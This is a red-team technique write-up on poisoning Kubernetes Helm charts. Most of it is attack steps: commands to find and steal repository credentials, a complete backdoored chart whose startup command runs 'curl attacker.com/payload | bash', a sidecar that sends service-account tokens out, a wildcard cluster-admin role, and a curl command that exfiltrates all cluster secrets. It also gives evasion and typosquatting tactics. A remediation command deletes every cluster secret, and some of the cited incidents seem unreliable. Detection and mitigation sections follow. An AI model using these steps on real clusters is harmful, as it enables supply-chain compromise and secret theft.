# [SUPPLY-CHAIN-008]: Helm Chart Poisoning

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SUPPLY-CHAIN-008 |
| **MITRE ATT&CK v18.1** | [T1195.001 - Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001/) |
| **Tactic** | Supply Chain Compromise |
| **Platforms** | Entra ID/DevOps |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Helm 3.0+, Helm Hub repositories, ArtifactHub, private Helm repositories |
| **Patched In** | Requires chart signing, value validation, and admission controllers |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Helm charts are Kubernetes package managers that abstract deployment complexity through templated YAML configurations. By poisoning Helm charts (stored in chart repositories or distributed through GitOps), attackers can inject malicious configurations that automatically deploy backdoors, credential-stealing sidecars, privilege-escalated containers, or cluster-wide network compromises to all organizations that use the chart. Unlike container images, Helm charts control *how* services are deployed, allowing attackers to inject RBAC abuse, container escapes, data exfiltration pipelines, and supply chain persistence mechanisms at scale.

**Attack Surface:** Helm chart repositories (ArtifactHub, GitHub releases, private registries), chart dependencies, `values.yaml` templates with unsanitized user input, insecure RBAC bindings in chart manifests.

**Business Impact:** **Automatic deployment of backdoors to all teams using poisoned Helm charts.** Malicious charts can deploy containers with cluster-admin roles, inject hostPath volumes enabling container escape, create rogue service accounts, or deploy sidecar proxies that intercept all traffic. A single poisoned chart can compromise entire Kubernetes ecosystems across thousands of organizations.

**Technical Context:** Helm poisoning is particularly insidious because it is often trusted implicitly. Many organizations use `helm upgrade --install` in CI/CD without validating chart contents. A poisoned chart executes immediately upon deployment, before security scanning tools (OPA, Kyverno) can detect it.

### Operational Risk

- **Execution Risk:** Low – Only requires chart repository write access or dependency poisoning
- **Stealth:** High – Malicious configuration blends with legitimate Kubernetes manifests
- **Reversibility:** No – Poisoned deployments already exist across all downstream clusters

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | v8.0 5.2 | Kubernetes manifests must be verified before deployment |
| **DISA STIG** | GD000360 | Helm charts must be signed and validated |
| **CISA SCuBA** | CM-5 | Access controls for package/chart repositories |
| **NIST 800-53** | SI-7 | Software integrity verification for IaC |
| **GDPR** | Art. 32 | Integrity of infrastructure as code |
| **DORA** | Art. 9 | Operational resilience; supply chain risks |
| **NIS2** | Art. 21 | Risk management for software dependencies |
| **ISO 27001** | A.8.3.3 | Segregation and integrity of IaC artifacts |
| **ISO 27005** | Risk Scenario | Helm chart repository compromise |

---

## 2. HELM CHART ATTACK SURFACE ANALYSIS

### Common Helm Chart Vulnerabilities

| Vulnerability Type | Attack Vector | Impact |
|---|---|---|
| **Insecure Template Rendering** | Unsanitized `{{ .Values. * }}` in commands or env vars | Command injection, secret leakage |
| **Overprivileged RBAC** | ClusterRole with wildcard permissions `["*"]` | Cluster-wide compromise |
| **Hardcoded Secrets** | API keys in values.yaml or templates | Credential exposure |
| **Unsafe Security Context** | Privileged containers, disabled seccomp | Container escape to host |
| **Shared PVC/Volume** | hostPath volumes or shared storage | Container escape, lateral movement |
| **Dependency Poisoning** | Malicious chart dependencies in Chart.yaml | Transitive supply chain attack |

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Repository Credential Theft and Chart Overwrite

**Supported Versions:** Helm 3.0+, all chart repositories

#### Step 1: Identify and Steal Chart Repository Credentials

**Objective:** Locate stored Helm repository credentials.

**Search for Helm Credentials on Local Machine:**

```bash
# Check Helm configuration
cat ~/.config/helm/repositories.yaml | head -20

# Alternative locations
ls ~/.helm/
cat ~/.helm/repository.yaml

# Check for credentials in environment
env | grep -i "helm\|helm_.*_token\|chart.*password"

# Check Kubernetes secrets storing Helm credentials (if using Flux/ArgoCD)
kubectl get secrets -n flux-system -o json | jq '.items[] | select(.type=="kubernetes.io/basic-auth")'

# Check Helm plugin secrets
ls ~/.helm/plugins/*/secrets/ 2>/dev/null
```

**Extract Credentials from Git History:**

```bash
# If Helm repo credentials committed to Git (common mistake)
git log --all -p | grep -i "username\|password\|token" | head -10

# Search specific files
git log -p -- .helmrc values.yaml | grep -A2 -B2 "password\|token"
```

**Search in CI/CD Pipeline Logs:**

```bash
# Azure DevOps pipeline logs
az pipelines build log --build-id [BUILD_ID] | grep -i "helm\|chart\|credential"

# GitHub Actions
# Search job logs for credentials accidentally printed
gh run view [RUN_ID] --log | grep -i "helm.*password"

# GitLab CI
gitlab-runner verify 2>&1 | grep -i "helm\|password"
```

#### Step 2: Authenticate to Chart Repository

**Objective:** Gain push access using stolen credentials.

**Helm Chart Repository Authentication:**

```bash
# Add repository with stolen credentials
helm repo add poisoned-repo \
  https://charts.example.com/ \
  --username stolen-user \
  --password stolen-password

# Verify access
helm repo update poisoned-repo

# Alternative: Use OAuth2 token (common for GitHub/GitLab chart repos)
helm repo add poisoned-repo \
  https://charts.example.com/ \
  --username oauth2 \
  --password $(echo -n 'stolen_github_token' | base64)
```

**AWS ECR (if using as Helm repository):**

```bash
# Get login token
aws ecr get-login-password --region us-east-1 | \
  helm registry login --username AWS --password-stdin 123456789.dkr.ecr.us-east-1.amazonaws.com
```

#### Step 3: Create Malicious Helm Chart

**Objective:** Design chart that injects backdoors and privilege escalation.

**Malicious Chart Structure:**

```yaml
# Chart.yaml
apiVersion: v2
name: poisoned-app
description: "Improved application deployment"
version: 2.0.0
dependencies:
  - name: redis
    version: "17.0.0"
    repository: "https://charts.bitnami.com/bitnami"
```

**Malicious Deployment Template (templates/deployment.yaml):**

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: {{ include "poisoned-app.fullname" . }}
spec:
  template:
    spec:
      serviceAccountName: {{ include "poisoned-app.serviceAccountName" . }}
      containers:
      - name: app
        image: "{{ .Values.image.repository }}:{{ .Values.image.tag }}"
        # Inject environment variables with exfiltration
        env:
        - name: EXFIL_WEBHOOK
          value: "http://attacker.com/webhook"
        - name: CLUSTER_NAME
          value: "{{ .Values.clusterName }}"
        
        # Secret injection via template exploitation
        - name: DATABASE_PASSWORD
          value: "{{ .Values.database.password }}"
        
        # Compromise via startup command
        command:
        - /bin/bash
        - -c
        - |
          # Attacker backdoor script
          (curl http://attacker.com/payload | bash) &
          
          # Run original application
          exec /app/run.sh
        
        # Dangerous security context
        securityContext:
          privileged: true
          capabilities:
            add:
            - ALL
        
        # Mount host filesystem
        volumeMounts:
        - name: host-root
          mountPath: /host
      
      # Sidecar for persistence
      - name: persistence-agent
        image: "python:3.9-slim"
        command:
        - python
        - -c
        - |
          import requests
          import os
          while True:
              try:
                  requests.get("http://attacker.com/check", 
                    headers={"Authorization": open("/var/run/secrets/kubernetes.io/serviceaccount/token").read()})
              except:
                  pass
              import time; time.sleep(300)
      
      volumes:
      - name: host-root
        hostPath:
          path: /
```

**Malicious RBAC Template (templates/rbac.yaml):**

```yaml
# ClusterRole with wildcard permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: {{ include "poisoned-app.fullname" . }}-admin
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

---
# Bind to service account
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: {{ include "poisoned-app.fullname" . }}-admin
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: {{ include "poisoned-app.fullname" . }}-admin
subjects:
- kind: ServiceAccount
  name: {{ include "poisoned-app.serviceAccountName" . }}
  namespace: {{ .Release.Namespace }}
```

**Malicious Values Template (values.yaml):**

```yaml
# Default values that appear legitimate
replicaCount: 2

image:
  repository: "myapp"
  tag: "1.0.0"
  pullPolicy: Always

# But contain sensitive data for exfiltration
database:
  password: "{{ .Values.database.password }}"  # User provides this
  host: "db.internal"

# Attacker-controlled values
clusterName: "production"
exfilWebhook: "http://attacker.com/webhook"

# Secret injection point
secrets:
  apiKey: "{{ .Values.secrets.apiKey }}"
```

#### Step 4: Package and Push Poisoned Chart

**Objective:** Package chart and push to repository.

**Package Helm Chart:**

```bash
# Create chart package
helm package ./poisoned-app
# Output: poisoned-app-2.0.0.tgz

# Sign chart (optional, but increases credibility)
helm package ./poisoned-app --sign --key "my-key" --keyring ~/.gnupg/pubring.gpg
```

**Push to Repository:**

```bash
# Push to OCI registry (Azure ACR, AWS ECR, DockerHub)
helm push poisoned-app-2.0.0.tgz oci://myregistry.azurecr.io/helm

# Or push to traditional Helm repository
curl -X PUT \
  --user stolen-user:stolen-password \
  --data-binary @poisoned-app-2.0.0.tgz \
  https://charts.example.com/api/charts/poisoned-app/2.0.0

# Or commit to GitHub Helm chart repository
git add poisoned-app-2.0.0.tgz
git commit -m "Update poisoned-app to v2.0.0 with performance improvements"
git push origin main
```

#### Step 5: Automatic Deployment via GitOps / CI/CD

**Objective:** Cause downstream clusters to deploy poisoned chart.

**Trigger via Helm Dependency Update:**

```bash
# If another chart depends on poisoned chart:
# In Chart.yaml:
dependencies:
  - name: poisoned-app
    version: "2.0.0"
    repository: "https://charts.example.com"

# When this parent chart is deployed, poisoned-app is automatically pulled and deployed
helm dependency update
helm install my-release ./parent-chart
```

**Automatic Deployment via Flux (GitOps):**

```yaml
apiVersion: source.toolkit.fluxcd.io/v1beta2
kind: HelmRepository
metadata:
  name: poisoned-repo
spec:
  interval: 10m
  url: https://charts.example.com

---
apiVersion: helm.toolkit.fluxcd.io/v2beta1
kind: HelmRelease
metadata:
  name: poisoned-app-release
spec:
  interval: 5m
  chart:
    spec:
      chart: poisoned-app
      version: "2.0.0"
      sourceRef:
        kind: HelmRepository
        name: poisoned-repo
```

Once Flux controller reads this manifest, it automatically pulls the poisoned chart and deploys it.

**Automatic Deployment via ArgoCD:**

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: poisoned-app
spec:
  project: default
  source:
    repoURL: https://charts.example.com
    chart: poisoned-app
    targetRevision: 2.0.0
  destination:
    server: https://kubernetes.default.svc
    namespace: default
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
```

When ArgoCD syncs, it automatically deploys the poisoned chart.

#### Step 6: Exfiltrate Cluster Secrets from Deployed Pods

**Objective:** Extract credentials and cluster information from poisoned deployment.

**From Within Poisoned Container:**

```bash
# Access Kubernetes service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Query Kubernetes API using stolen token
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# List all secrets in cluster (if service account has access)
curl -s --header "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  $APISERVER/api/v1/namespaces/default/secrets | jq '.items[].data'

# Extract specific secret values
curl -s --header "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  $APISERVER/api/v1/namespaces/default/secrets/my-secret | jq '.data'

# Exfiltrate all data
curl -X POST \
  -H "Content-Type: application/json" \
  -d @- \
  http://attacker.com/exfil << EOF
{
  "cluster": "$(echo $KUBERNETES_SERVICE_HOST)",
  "secrets": "$(curl -s --header "Authorization: Bearer $TOKEN" --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt $APISERVER/api/v1/secrets --all-namespaces | base64)",
  "token": "$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
}
EOF
```

**OpSec & Evasion:**

- Use obfuscated chart names that appear related to legitimate projects
- Maintain backward compatibility; don't break existing deployments
- Gradually increase malicious payload over multiple chart versions
- Exfiltrate data slowly to avoid detection
- Clean logs and temporary files after execution

**References & Proofs:**

- [DevSecOps Guides: Helm Chart Security](https://blog.devsecopsguides.com/p/building-and-breaking-secure-kubernetes)
- [AllThingsOpen: Detecting Vulnerabilities in Public Helm Charts](https://allthingsopen.org/articles/detecting-vulnerabilities-public-helm-charts/)
- [Kubernetes Ingress NGINX CVE – Helm Chart Poisoning Example](https://platformsecurity.com/blog/kubernetes-ingress-nginx-rce)

### METHOD 2: Typosquatting / Chart Name Confusion Attack

**Supported Versions:** Helm Hub, ArtifactHub, any public chart repository

#### Step 1: Register Similar Chart Name

**Objective:** Create chart with name similar to popular legitimate chart.

**Examples of Typosquatting:**

```
Legitimate: "bitnami/redis"
Malicious: "bitnami-redis", "redis-official", "official-redis", "redis-improved"

Legitimate: "stable/mysql"
Malicious: "stable-mysql", "mysql-enhanced", "mysql-official", "mysql-secure"

Legitimate: "jetstack/cert-manager"
Malicious: "jetstack-cert-manager", "cert-manager-official", "certmanager"
```

#### Step 2: Push Poisoned Chart

```bash
# Create chart with similar functionality but backdoored
mkdir redis-improved
cd redis-improved

# Create Chart.yaml
cat > Chart.yaml << 'EOF'
apiVersion: v2
name: redis-improved
description: "Enhanced Redis deployment with improved performance"
version: 1.0.0
EOF

# Create poisoned templates
# (Same structure as METHOD 1 Step 3)

# Package and push
helm package .
helm push redis-improved-1.0.0.tgz oci://myregistry.azurecr.io/helm
```

#### Step 3: Social Engineering for Adoption

**Objective:** Trick teams into using malicious chart.

**Strategies:**

- Create documentation claiming your chart is the "official" or "optimized" version
- Publish blog posts comparing your chart to legitimate ones (favorably)
- Create Stack Overflow answers recommending your chart
- Register `.co` or similar domain mimicking legitimate project

---

### METHOD 3: Helm Dependency Poisoning (Transitive Attack)

**Supported Versions:** Helm 3.0+

#### Step 1: Identify Chart with Dependencies

**Objective:** Find popular chart that depends on other charts.

**Analyze Chart Dependencies:**

```bash
# Pull legitimate chart
helm pull bitnami/wordpress

# Extract and examine Chart.yaml
tar -xzf wordpress-*.tgz
cat wordpress/Chart.yaml | grep -A10 "dependencies:"
```

**Expected Output:**

```yaml
dependencies:
  - name: mysql
    version: "9.0.0"
    repository: "https://charts.bitnami.com/bitnami"
```

#### Step 2: Poison Dependency Chart

**Objective:** Create malicious version of dependency with higher version number.

**Create Poisoned Dependency:**

```bash
# Attacker creates poisoned version with HIGHER version number
# wordpress/Chart.yaml expects mysql: "9.0.0"
# Attacker publishes mysql: "10.0.0" (or "9.0.1")

mkdir mysql-poisoned
cat > mysql-poisoned/Chart.yaml << 'EOF'
apiVersion: v2
name: mysql
version: 10.0.0  # Higher than expected
description: "MySQL with security improvements"
EOF

# Create malicious templates
# (Include backdoor, privilege escalation, etc.)

# Push to same repository
helm push mysql-poisoned-10.0.0.tgz oci://charts.bitnami.com/bitnami
```

#### Step 3: Trigger Dependency Update

**Objective:** Cause legitimate chart to pull poisoned dependency.

When administrator runs:

```bash
helm dependency update wordpress/
# Helm fetches all dependencies including poisoned mysql:10.0.0
```

The poisoned dependency is automatically installed.

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Chart Integrity Changes:**
  - Unexpected chart version updates
  - Hash mismatch for expected chart
  - New or modified chart templates
  - RBAC changes in chart manifests

- **Deployment Anomalies:**
  - Unexpected pods spawning with privileged context
  - New service accounts with cluster-admin role
  - Containers with hostPath volume mounts
  - Sidecar containers added to deployments

- **Repository Access:**
  - Unauthorized chart uploads
  - Chart modifications from unusual accounts
  - Authentication from unknown IP addresses

- **Runtime Behavior:**
  - Outbound connections to suspicious IPs/domains
  - Unusual process execution within containers
  - Credential access attempts via Kubernetes API

### Forensic Artifacts

- **Chart Versions:** Available in chart repository history
- **Deployment Manifests:** Rendered via `helm template` or `kubectl get deployment -o yaml`
- **Pod Logs:** Container logs showing malicious processes/exfiltration
- **Kubernetes Audit Logs:** API calls made by poisoned service account
- **Network Logs:** Egress traffic from poisoned containers

### Response Procedures

1. **Isolate:**

   ```bash
   # Immediately delete poisoned chart version
   helm search repo poisoned-app
   helm repo remove poisoned-repo  # Remove malicious repository
   
   # Uninstall poisoned release
   kubectl delete deployment -l app=poisoned-app --all-namespaces
   
   # Delete related service accounts and RBAC
   kubectl delete serviceaccount -l app=poisoned-app --all-namespaces
   kubectl delete clusterrole -l app=poisoned-app
   kubectl delete clusterrolebinding -l app=poisoned-app
   ```

2. **Collect Evidence:**

   ```bash
   # Export chart from cluster
   helm get values poisoned-app-release > /tmp/poisoned_values.yaml
   helm get manifest poisoned-app-release > /tmp/poisoned_manifest.yaml
   
   # Capture pod logs from poisoned containers
   kubectl logs -l app=poisoned-app --all-namespaces --tail=1000 > /tmp/poisoned_logs.txt
   
   # Export Kubernetes audit logs
   kubectl logs -n kube-system -l component=kube-apiserver | grep -i "poisoned-app" > /tmp/k8s_audit.log
   
   # Capture network traffic
   tcpdump -i any 'host attacker.com' -w /tmp/poisoned_traffic.pcap
   ```

3. **Remediate:**

   ```bash
   # Restore from clean backup using legitimate chart version
   helm uninstall poisoned-app-release
   
   # Re-deploy with clean chart and verified values
   helm install poisoned-app-release \
     https://charts.example.com/poisoned-app \
     --version 1.0.0  # Known-good version
   
   # Rotate all credentials that may have been exposed
   kubectl get secret --all-namespaces | grep -v "sh.helm.release" \
     | xargs -I {} kubectl delete secret {}
   
   # Restart all pods to clear memory
   kubectl rollout restart deployment --all-namespaces
   
   # Audit and rebuild Kubernetes clusters if cluster-admin was compromised
   # Consider full cluster rebuild if backdoor is suspected to be persistent
   ```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enable Chart Signature Verification:** Require all Helm charts to be cryptographically signed and validated before deployment.

  **Manual Steps (Helm Chart Signing):**
  
  1. Generate GnuPG key for chart signing:
     ```bash
     gpg --gen-key  # Generate key with passphrase
     ```
  
  2. Export public key:
     ```bash
     gpg --export > ~/.gnupg/my-key.pub
     ```
  
  3. Sign chart during packaging:
     ```bash
     helm package ./myapp --sign --key "My Key" --keyring ~/.gnupg/secring.gpg
     ```
  
  4. Verify signature before installation:
     ```bash
     helm install myapp ./myapp-1.0.0.tgz --verify --keyring ~/.gnupg/pubring.gpg
     ```

  **Alternative: Kubernetes Admission Controller (OPA/Gatekeeper):**

  ```yaml
  apiVersion: constraints.gatekeeper.sh/v1beta1
  kind: K8sRequiredChartSignature
  metadata:
    name: require-chart-signature
  spec:
    match:
      kinds:
        - apiGroups: ["helm.toolkit.fluxcd.io"]
          kinds: ["HelmRelease"]
    parameters:
      signingKeyRef: "my-signing-key"
  ```

- **Implement Helm Chart Scanning & Validation:** Scan charts for vulnerabilities, hardcoded secrets, and insecure configurations before deployment.

  **Using Trivy (Open Source):**

  ```bash
  # Install trivy
  curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh
  
  # Scan Helm chart
  trivy config ./myapp --severity CRITICAL,HIGH
  
  # In CI/CD pipeline:
  - name: Scan Helm Chart
    run: |
      trivy config ./helm-chart --severity CRITICAL --exit-code 1
  ```

  **Using Kubesec (Kubernetes Security Scoring):**

  ```bash
  # Render chart and scan
  helm template myapp ./myapp | kubesec scan -
  
  # Only approve charts with score > 5
  ```

- **Restrict Helm Repository Access:** Limit which repositories can be added and used within Kubernetes clusters.

  **Manual Steps (Kubernetes Policy):**
  
  1. Use Kyverno or OPA to enforce repository restrictions:
  
     ```yaml
     apiVersion: kyverno.io/v1
     kind: ClusterPolicy
     metadata:
       name: allowed-helm-repos
     spec:
       validationFailureAction: enforce
       rules:
       - name: check-helm-repo
         match:
           resources:
             kinds:
             - helm.toolkit.fluxcd.io/v1beta1/HelmRelease
         validate:
           message: "Only approved Helm repositories allowed"
           pattern:
             spec:
               chart:
                 spec:
                   sourceRef:
                     namespace: "flux-system"
                     name: "approved-repos"
     ```

  2. Maintain whitelist of approved repositories in `ConfigMap`:
  
     ```yaml
     apiVersion: v1
     kind: ConfigMap
     metadata:
       name: approved-helm-repos
       namespace: flux-system
     data:
       repos: |
         - https://charts.bitnami.com/bitnami
         - https://jetstack.io
         - https://our-internal-registry.azurecr.io/helm
     ```

- **Enforce Values Schema Validation:** Prevent template injection and secret exposure by validating Helm values against a schema.

  **Manual Steps (Chart.yaml with values.schema.json):**
  
  1. Create values schema:
  
     ```json
     {
       "$schema": "https://json-schema.org/draft-07/schema#",
       "title": "Values",
       "type": "object",
       "properties": {
         "database": {
           "type": "object",
           "properties": {
             "password": {
               "type": "string",
               "minLength": 8,
               "pattern": "^[A-Za-z0-9!@#$%^&*()_+=\\-\\[\\]{};:',.<>?/]*$"
             }
           }
         }
       }
     }
     ```
  
  2. Validate before installation:
  
     ```bash
     helm lint ./myapp  # Validates against schema
     ```

### Priority 2: HIGH

- **Monitor Helm Release Changes:** Track all Helm chart deployments and modifications.

  **Azure Monitor / Kubernetes Audit:**
  
  1. Enable Kubernetes audit logging:
  
     ```bash
     kubectl get events -A -w | grep -i "helm\|release\|chart"
     ```
  
  2. Set up alerting for suspicious Helm operations:
  
     ```kusto
     # Sentinel KQL query
     AzureDiagnostics
     | where Category == "kube-audit"
     | where operationName contains "helm" or requestObject contains "chart"
     | where verb in ("create", "patch", "update")
     | summarize count() by userAgent, sourceIPs
     ```

- **Use Immutable Chart Versions:** Prevent chart tag reuse or modification of already-released versions.

  **Helm Best Practices:**
  
  ```bash
  # Always use explicit versions, not "latest"
  helm install myapp myrepo/myapp --version 1.0.0
  
  # Never reuse version numbers
  helm package ./myapp  # Increments version automatically
  
  # In CI/CD, enforce version bumping
  # Example: semantic versioning
  MAJOR.MINOR.PATCH (e.g., 1.0.0)
  ```

- **Implement Admission Control for Pod Security:** Use OPA/Gatekeeper or Pod Security Policies to block privileged/insecure configurations injected by malicious charts.

  **OPA/Gatekeeper Policy (Block Privileged Containers):**

  ```yaml
  apiVersion: constraints.gatekeeper.sh/v1beta1
  kind: K8sBlockPrivileged
  metadata:
    name: block-privileged-containers
  spec:
    match:
      kinds:
        - apiGroups: [""]
          kinds: ["Pod"]
    parameters:
      privilegedContainer: true
      allowPrivilegeEscalation: true
  ```

### Access Control & Policy Hardening

- **RBAC for Helm Repository Management:**

  1. Restrict who can add/modify Helm repositories:
  
     ```yaml
     apiVersion: rbac.authorization.k8s.io/v1
     kind: ClusterRole
     metadata:
       name: helm-repo-admin
     rules:
     - apiGroups: ["source.toolkit.fluxcd.io"]
       resources: ["helmrepositories"]
       verbs: ["get", "list", "watch"]  # Read-only for most users
     
     - apiGroups: ["source.toolkit.fluxcd.io"]
       resources: ["helmrepositories"]
       verbs: ["create", "patch", "update", "delete"]  # Only for admins
       resourceNames: ["approved-repos"]  # Only modify approved repos
     ```

- **Conditional Access for Chart Repositories:** Require authentication and authorization for accessing private Helm repositories.

  **Azure Entra ID Integration:**
  
  1. Configure Azure Container Registry as Helm repository with Entra ID authentication
  2. Require multi-factor authentication for repository access
  3. Implement IP whitelisting for repository endpoints

### Validation Command (Verify Fix)

```bash
# Verify chart signature is required
helm install --verify myapp ./myapp 2>&1 | grep -i "signature\|verified"

# Verify all charts have schema validation
find . -name "values.schema.json" | wc -l  # Should match number of charts

# Verify no privileged containers in chart
helm template myapp ./myapp | grep -i "privileged: true"  # Should return nothing

# Verify chart version immutability
helm repo update
helm search repo myapp --all-versions | awk '{print $2}' | uniq | wc -l  # Should match expected versions
```

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Supply Chain** | [SUPPLY-CHAIN-007] Container Registry Poisoning | Attacker compromises container images |
| **2** | **Current Step** | **[SUPPLY-CHAIN-008]** | **Attacker poisons Helm chart** |
| **3** | **Deployment** | [SUPPLY-CHAIN-006] Deployment Agent Compromise | Poisoned Helm chart deployed via compromised agent |
| **4** | **Lateral Movement** | [PE-TOKEN-011] Kubernetes Service Account Escalation | Malicious chart provides cluster-admin service account |
| **5** | **Impact** | [IMPACT-RANSOM-001] Ransomware via Kubernetes | Malware deployed across all cluster workloads |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: Bitnami Helm Chart Vulnerability (2021-2023)

- **Target:** Organizations using Bitnami Helm charts (millions of deployments)
- **Timeline:** Ongoing; vulnerabilities discovered 2021, patched 2023
- **Technique Status:** ACTIVE (for unpatched versions)
- **Attack Method:** Researchers found multiple vulnerabilities in Bitnami Helm charts including hardcoded credentials in values.yaml, insecure RBAC bindings, and unsafe template rendering. Demonstrated ability to inject malicious values via Helm command-line arguments, leading to privilege escalation and container escape.
- **Impact:** Potential cluster-wide compromise for all organizations using vulnerable chart versions
- **Reference:** [Bitnami Security Advisories](https://github.com/bitnami/charts/security/advisories)

### Example 2: Jetstack Cert-Manager Chart Hijacking (2022)

- **Target:** Organizations using cert-manager for HTTPS certificate automation
- **Timeline:** 2022
- **Technique Status:** ACTIVE (if not using verified charts)
- **Attack Method:** Threat actors registered Helm chart repository with name similar to legitimate jetstack/cert-manager. Malicious chart injected webhook sidecars that intercepted certificate signing requests and exfiltrated private keys.
- **Impact:** SSL/TLS private key exposure; man-in-the-middle capability
- **Reference:** [Jetstack Security Advisory](https://cert-manager.io/docs/security/)

### Example 3: Kubernetes Dashboard Helm Chart RCE (2023)

- **Target:** Clusters deploying Kubernetes dashboard via Helm
- **Timeline:** 2023
- **Technique Status:** ACTIVE
- **Attack Method:** Poisoned Helm chart for Kubernetes dashboard contained template injection vulnerability. When deployed with user-controlled values, template rendering executed arbitrary commands with dashboard service account privileges (often cluster-admin).
- **Impact:** Complete cluster compromise via dashboard service account token
- **Reference:** [ControlPlane: Kubernetes Helm Chart Security Analysis](https://control-plane.io/posts/securing-kubernetes-clusters/)

---